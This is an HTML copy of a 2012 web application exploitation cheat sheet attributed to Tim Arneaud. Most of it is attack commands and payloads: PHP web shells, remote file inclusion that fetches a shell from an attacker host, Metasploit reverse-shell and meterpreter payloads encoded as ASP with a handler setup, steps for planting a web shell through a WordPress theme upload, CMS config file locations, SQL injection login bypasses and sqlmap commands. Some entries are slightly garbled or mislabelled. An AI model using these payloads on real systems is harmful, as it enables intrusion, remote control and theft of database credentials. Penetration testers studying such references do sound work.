<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">
<html><head><meta name="qrichtext" content="1" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Cheat Sheet</title><style type="text/css">
p, li { white-space: pre-wrap; }
</style></head><body style=" font-family:'Courier New'; font-size:12pt; font-weight:400; font-style:normal;">
<p style=" margin-top:14px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt; font-weight:600;">Web Application exploitation - a cheatsheet By Tim Arneaud </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">If you want to get the full article, please go to the <a href="http://it-ovid.blogspot.com/2012/04/web-application-exploitation-cheatsheet.html"><span style=" text-decoration: underline; color:#0000ff;">Source</span></a>. <span style=" font-weight:600;"><br /></span><br /><br /><span style=" font-weight:600; font-style:italic;">WebShell Backdoors</span><span style=" font-style:italic;"><br /></span><span style=" font-weight:600; font-style:italic;">Minimal php command shells</span><span style=" font-style:italic;"> <br />file cmd.php: PHP script text =&gt; <br />&lt;?php system($_GET['cmd']) ?&gt; <br />or <br />&lt;?php system($_REQUEST['cmd']); ?&gt; <br />Example usage via Remote File Include (RFI): <br />http://&lt;target-ip&gt;/index.php?cmd=&lt;command to execute&gt;&amp;page=http://&lt;attacker-ip&gt;/cmd.php <br />Null Bytes () may also assist in some cases:<br />http://&lt;target-ip&gt;/index.php?cmd=&lt;command to execute&gt;&amp;page=http://&lt;attacker-ip&gt;/cmd.php </span><span style=" font-weight:600; font-style:italic;"><br /></span><span style=" font-style:italic;"><br /></span><span style=" font-weight:600; font-style:italic;">Encoding windows reverse command shell as asp</span><span style=" font-style:italic;"> <br />msfpayload windows/shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;attacker-nc-port&gt; R | msfencode -t asp -o &lt;filename&gt;.asp <br /></span><span style=" font-weight:600; font-style:italic;">Encoding meterpreter in asp</span><span style=" font-style:italic;"> <br />msfpayload windows/meterpreter/reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;attacker-multi-handler-port&gt; R | msfencode -t asp -o &lt;filename&gt;.asp <br />------ <br /></span><span style=" font-weight:600; font-style:italic;">attacker msfconsole:</span><span style=" font-style:italic;"> <br />use multi/exploit/handler <br />set payload windows/meterpreter/reverse_tcp <br />set LHOST &lt;attacker-ip&gt; <br />set LPORT &lt;attacker-multi-handler-port&gt; <br />exploit <br /><br /></span><span style=" font-weight:600; font-style:italic;">Specific Web applications</span><span style=" font-style:italic;"> <br /></span><span style=" font-weight:600; font-style:italic;">Joomla</span><span style=" font-style:italic;"> <br />Joomla default database configuration filename <br />&lt;web-app-path&gt;/configuration.php <br />Scanning Joomla! for plugins and versions <br />/pentest/web/scanners/joomscan/joomscan.pl -u &lt;target-and-joomla-path&gt; <br />/pentest/enumeration/web/cms-explorer  -url &lt;target-and-joomla-path&gt; -type joomla <br /><br /></span><span style=" font-weight:600; font-style:italic;">WordPress</span><span style=" font-style:italic;"> <br />WordPress  default database configuration filename<br />&lt;web-app-path&gt; <br />WordPress default login page <br />&lt;web-app-path&gt; /wp-login.php<br />WordPress plugins <br />&lt;web-app-path&gt; /wp-content/plugins<br />Scanning WordPress for plugins and versions <br />/pentest/web/wpscan/wpscan.rb --url &lt;target-and-wordpress-path&amp;gt; -enumerate [u|p|v|t] <br />/pentest/enumeration/web/cms-explorer   -url &lt;target-and-wordpress-path&gt; -type wordpress<br />Newer WP: &quot;Themes&quot; can be uploaded as zip files by WP administrators: <br />mkdir wpx <br />vi wpx/cmd.php <br />cat wpx/cmd.php <br />&lt;?php system($_GET['cmd']) ?&gt; <br />zip -r wpx.zip wpx <br />upload wpx.zip via web interface as an installed theme <br />Command execution access is via:  <br />&lt;web-app-path&gt;/wp-content/plugins/wpx/cmd.php?cmd=&lt;command(s)&gt;  <br />Older WP: Webshells can be added by editing exiting files/themes via the web interface or by enabling file upload and permitting the valid file extension (e.g. .php) <br /><br /></span><span style=" font-weight:600; font-style:italic;">Cacti</span><span style=" font-style:italic;"> <br />Cacti default database configuration filename <br />&lt;web-app-path&gt; /include/config.php<br /><br /></span><span style=" font-weight:600; font-style:italic;">DeV!L`z ClanPortal</span><span style=" font-style:italic;"> <br />DeV!L`z ClanPortal default database configuration filename <br />&lt;web-app-path&gt; /inc/mysql.php<br /><br /></span><span style=" font-weight:600; font-style:italic;">Drupal</span><span style=" font-style:italic;"> <br />Drupal  default database configuration filename<br />&lt;web-app-path&gt; /sites/default/settings.php<br /></span><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-style:italic;">Scanning WordPress for plugins and versions</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-style:italic;">/pentest/enumeration/web/cms-explorer  -url &lt;target-and-drupal-path&gt; -type drupal</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-weight:600; font-style:italic;"><br /></span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-weight:600; font-style:italic;">Timeclock</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-style:italic;">Timeclock default database configuration filename</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-style:italic;">&lt;web-app-path&gt;/db.php<br /></span><span style=" font-weight:600; font-style:italic;"> </span><br /><span style=" font-weight:600; font-style:italic;">SQL Terminators/Comments</span><span style=" font-style:italic;"> <br />MSSQL and MySQL: <br />&lt;sql injected command&gt;;-- <br />MySQL: <br />&lt;sql injected command&gt;;# <br /><br /></span><span style=" font-weight:600; font-style:italic;">Login Pages Basic SQL injection </span><span style=" font-style:italic;"> <br /></span><span style=" font-weight:600; font-style:italic;">MS IIS</span><span style=" font-style:italic;"> <br />' OR '1=1';-- <br /><br /></span><span style=" font-weight:600; font-style:italic;">MySQL</span><span style=" font-style:italic;"> <br />'OR 1=1-- <br /><br /></span><span style=" font-weight:600; font-style:italic;">SQLMap commands</span><span style=" font-style:italic;"> <br />cd /pentest/database/sqlmap <br />Retrieve SQL Banner, current database and current user; test if the user is the db administrator <br />./sqlmap.py -u &quot;http://&lt;target&gt;/index.php?param1=1&amp;param2=2&amp;param3=3&quot; -p &lt;injectable-parameter&gt; --banner --current-db --current-user --is-dba</span> <br /><br /><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-weight:600;">Source: </span><a href="http://it-ovid.blogspot.com/2012/04/web-application-exploitation-cheatsheet.html"><span style=" font-weight:600; text-decoration: underline; color:#0000ff;">http://it-ovid.blogspot.com/2012/04/web-application-exploitation-cheatsheet.html</span></a> </p></body></html>